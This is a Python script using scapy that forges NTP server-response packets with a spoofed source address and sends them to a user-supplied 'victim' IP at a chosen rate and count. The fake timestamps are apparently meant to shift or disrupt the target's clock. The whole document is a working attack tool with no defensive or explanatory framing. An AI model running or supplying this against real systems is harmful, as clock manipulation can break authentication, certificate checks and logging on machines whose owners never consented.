import socket
from scapy.all import *
import sys
from datetime import datetime
import ntplib

source_ip=raw_input("Enter spoofed IPv4 source address: ")
dest_ip=raw_input("Enter destination/victim IPv4 address: ")
num_of_pkts=int(raw_input("Enter the number of spoofed packets to be sent: "))
sleep_time=float(raw_input("Enter sleep time between consecutive spoofed packets in seconds: "))


# Form the spoofed packet
def custom_packet():
	ip=IP(src=source_ip, dst=dest_ip, version=4, ttl=64)
	udp= UDP(sport=123, dport=123, chksum=0)
	t=time.time()
	ntp= NTP(leap=0, mode=4, version=4, stratum=2, id="8.8.8.8", poll=6, precision=-29, delay=0.000, dispersion=0.00000, ref=ntplib.system_to_ntp_time(t-0.1), orig=ntplib.system_to_ntp_time(ntplib.ntp_to_system_time(0)), recv=ntplib.system_to_ntp_time(t-0.0001), sent=ntplib.system_to_ntp_time(t+0.00001))
	packet=(ip/udp/ntp)
	send(packet)

for pkt in range(num_of_pkts):
	custom_packet()
	time.sleep(sleep_time)
